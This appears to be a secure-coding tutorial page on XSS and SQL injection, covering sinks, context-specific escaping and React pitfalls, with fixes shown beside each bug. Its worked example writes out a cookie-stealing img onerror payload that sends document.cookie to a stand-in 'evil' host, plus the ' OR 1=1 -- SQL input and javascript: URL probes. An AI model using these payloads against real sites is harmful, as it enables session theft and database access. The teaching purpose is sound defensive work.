---
title: Where untrusted input becomes code
question: Where can a user's string turn into code I did not write?
order: 1
practise:
  - security-xss-source
  - dom-innerhtml-xss
  - security-sql-injection
sources:
  - author: OWASP
    title: Cross Site Scripting Prevention Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
  - author: OWASP
    title: DOM based XSS Prevention Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
  - author: OWASP
    title: SQL Injection Prevention Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
  - author: OWASP
    title: Cross Site Scripting (XSS)
    url: https://owasp.org/www-community/attacks/xss/
  - author: MDN
    title: Cross-site scripting (XSS)
    url: https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS
  - author: MDN
    title: 'Element: innerHTML property'
    url: https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML
  - author: MDN
    title: 'Node: textContent property'
    url: https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent
  - author: MDN
    title: eval()
    url: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval
  - author: MDN
    title: 'javascript: URLs'
    url: https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Schemes/javascript
  - author: React
    title: 'Common components (e.g. <div>)'
    url: https://react.dev/reference/react-dom/components/common
  - author: React
    title: Introducing JSX
    url: https://legacy.reactjs.org/docs/introducing-jsx.html
  - author: React
    title: React 19 Upgrade Guide
    url: https://react.dev/blog/2024/04/25/react-19-upgrade-guide
verified: 2026-08-02
---

## The model

Injection is one bug in several costumes. Untrusted data reaches an interpreter on the same channel
as the code, and the interpreter parses the whole string at once. It cannot tell the part you wrote
from the part a stranger typed, because by the time it parses, the two are one string.

Name the interpreter and you have named the vulnerability. Concatenate a value into SQL and it is
the SQL parser. Assign it to `innerHTML` and it is the HTML parser. Pass it to `eval`, or put it
after `javascript:` in a link, and it is the JavaScript engine. Three parsers, three names in the
bug tracker, one shape.

OWASP states the fix rather than the bug, and it is the cleanest sentence on the subject: with
parameterised queries "the database will always distinguish between code and data, regardless of
what user input is supplied". Either the value travels on a channel of its own, or it is made
unparseable first. Everything below is one of those two.

### XSS in its three sites

What separates them is where the payload rests before it runs, not what it does afterwards. MDN
defines all three at once: an attack "in which an attacker is able to get a target site to execute
malicious code as though it was part of the website", which means your origin, so the session
cookie, the DOM, and every API the page is allowed to call.

**Reflected** is the payload that lives in the link. OWASP: "those where the injected script is
reflected off the web server, such as in an error message, search result, or any other response that
includes some or all of the input sent to the server as part of the request." Someone has to click.

**Stored** is the payload that lives in your data. OWASP: "those where the injected script is
permanently stored on the target servers, such as in a database, in a message forum, visitor log,
comment field, etc." Nobody has to click, because the page hands it to everyone who loads it.

**DOM-based** is the payload the server never renders. OWASP: "Reflected and Stored XSS are server
side injection issues while DOM based XSS is a client (browser) side injection issue." A script in
the page read something out of the URL or the DOM and passed it to a sink, so neither the templates
nor the request log shows anything.

Stored XSS is why the database is not a trust boundary: it is the same untrusted input arriving
later, laundered by a round trip through a schema, a migration and an ORM, none of which inspected
it. Validating on the way in is worth doing and is not what makes the output safe, because on the
way in you do not yet know the context the value lands in.

### The sinks that parse

A grep list. Each of these takes a string and turns it into something that runs.

- `innerHTML` and `outerHTML`. MDN calls `innerHTML` "probably the most common vector for cross-site
  scripting (XSS) attacks".
- `insertAdjacentHTML()`, which parses its argument the same way.
- `document.write()` and `document.writeln()`, on OWASP's list of places never to put untrusted
  data.
- `eval()`, and what OWASP files under "avoid the numerous methods which implicitly `eval()` data
  passed to it": `new Function`, and `setTimeout` or `setInterval` given a string rather than a
  function. MDN: `eval()` "executes the code it's passed with the privileges of the caller".
- `javascript:` in anything the browser navigates to: an `<a>` `href`, a `<form>` `action`, an
  `<iframe>` `src`, `window.location`. MDN: it "may lead to execution of arbitrary code".
- `dangerouslySetInnerHTML` in React, which "Overrides the `innerHTML` property of the DOM node".

One quirk of `innerHTML` reads as a defence and is not: a `<script>` element assigned through it
does not execute. MDN: "While the property does prevent `<script>` elements from executing when
they are injected, it is susceptible to many other ways that attackers can craft HTML to run
malicious JavaScript."

### The escape depends on the context

There is no such thing as escaped, only escaped for somewhere. MDN: "The type of encoding that needs
to be done is different depending on the context in which the input is being interpolated."

- **An HTML body**, between tags: the dangerous characters become entities, `<` to `&lt;`, `&` to
  `&amp;`, `"` to `&quot;`, `'` to `&#x27;`.
- **An attribute value**: the quoting matters as much as the entities. OWASP: "It's critical to use
  quotation marks like `"` or `'` to surround your variables." Unquoted, a space ends the value.
- **A URL**: percent-encoding, plus a separate check on the scheme, because percent-encoding says
  nothing about `javascript:`.
- **Inside a `<script>`**: OWASP allows exactly one position, a quoted data value. MDN is blunter,
  calling input inside `<script>` or `<style>` tags "almost always unsafe".

Mixing them up is its own failure mode. OWASP: "Using the wrong encoding method may introduce
weaknesses or harm the functionality of your application." That is why hand-escaping loses: you have
to be right four ways, at every call site, forever, and one miss is a breach.

`textContent` wins by not entering the competition. OWASP: "The most fundamental safe way to
populate the DOM with untrusted data is to use the safe assignment property `textContent`." Nothing
is parsed, so there is no encoding decision to get wrong, which is why MDN advises against
`innerHTML` even for text you are sure of. A strict Content-Security-Policy, which
[security headers](../headers/security-headers.md) covers, sits behind all of it and catches the
injection you missed.

### React escapes by default, and leaves two doors

React's own docs: "By default, React DOM escapes any values embedded in JSX before rendering them."
So `{comment.body}` renders as text whatever it contains, and the ordinary rendering path is not
where React applications get XSS. Two doors stay open.

`dangerouslySetInnerHTML` is the first, and its name is the documentation. React: "This should be
used with extreme caution! If the HTML inside isn't trusted (for example, if it's based on user
data), you risk introducing an XSS vulnerability." An interpolated URL is the second, because
escaping never inspects a scheme. React 19 closed that door, listing "Error for javascript URLs in
`src` and `href`" among its breaking changes, and nothing outside React checks a scheme for you.

## Worked example

The same input at two layers, sink and fix side by side:

```js
// comment.body is: Nice work<img src=x onerror="fetch('//evil/?c=' + document.cookie)">
el.innerHTML = comment.body; // the parser builds the img, the img fails, the handler runs
el.textContent = comment.body; // characters, and no encoding decision to get wrong

// email is: ' OR 1=1 --
db.query(`SELECT * FROM users WHERE email = '${email}'`); // the SQL parser reads the quote
db.query('SELECT * FROM users WHERE email = ?', [email]); // the value never reaches the parser
```

One bug, two interpreters. The SQL half goes on to
[the next page](./parameterised-queries.md), parameter binding and what an ORM does and does not
promise on top of it. The React cases, in the order they get got wrong:

```jsx
<p>{comment.body}</p>; // escaped by JSX, whatever the string contains
<p dangerouslySetInnerHTML={{ __html: comment.body }} />; // innerHTML with a longer name
<a href={user.website}>Website</a>; // escaped as a string, and the scheme was never checked
```

The href, with the check no amount of escaping can do for you:

```js
const SAFE_SCHEMES = new Set(['http:', 'https:']);

function safeHref(raw) {
  try {
    const url = new URL(raw, window.location.origin); // throws a TypeError on a non-URL
    return SAFE_SCHEMES.has(url.protocol) ? url.href : '#'; // protocol keeps its colon
  } catch {
    return '#';
  }
}
```

## Traps

**The comment shows as `&lt;b&gt;bold&lt;/b&gt;` in the CSV export and still executes on the page.**
It was HTML-encoded once, on the way into the database, which is wrong everywhere the output is not
HTML and useless anywhere something decodes it again. Store what the user typed, and encode at each
output, where you know whether you are writing a body, an attribute, a URL or a script.

**The payload contained no `<script>` tag at all.** It did not need one, and the filter that
stripped `<script>` was aimed at the one thing `innerHTML` already refuses to run. MDN's own example
is `<img src='x' onerror='alert(1)'>`. Event handler attributes are unsafe as a class, so a filter
by tag name is a denylist, and denylists lose. Assign to `textContent`, or sanitise with a
maintained library when the requirement is user-authored HTML.

**Nothing in the server logs, nothing in the templates, and a script ran anyway.** The bug is
DOM-based, so nothing was injected server-side. A script in the page read `location.search`,
`location.hash` or an element's own markup and passed it to a sink. Grep the sink list rather than
the templates, and treat the whole URL, fragment included, as attacker-supplied.

**The profile link is fine in review and runs script once a user saves one.** The value went into
`href`, and the only defence was escaping, which never looks at the scheme. `javascript:alert(1)`
contains nothing that needs escaping. Parse the URL and allowlist `http:` and `https:`.

**The name renders correctly, and the tooltip attribute breaks out of itself.** The value landed in
an unquoted attribute, so the first space ended it and everything after became new attributes on the
same element, `onmouseover=` included. Quote the attribute, then encode for the attribute context.
The quoting is not style here; it is what makes the encoding sufficient.

**The search endpoint crashes on O'Brien.** The same bug, reported as a bug rather than a breach:
the apostrophe closed the string literal and the SQL parser read the rest of the name as syntax. A
query a customer can break by accident is a query an attacker can break on purpose. Concatenation is
the cause both times, and the fix is parameter binding, which
[the next page](./parameterised-queries.md) takes apart.
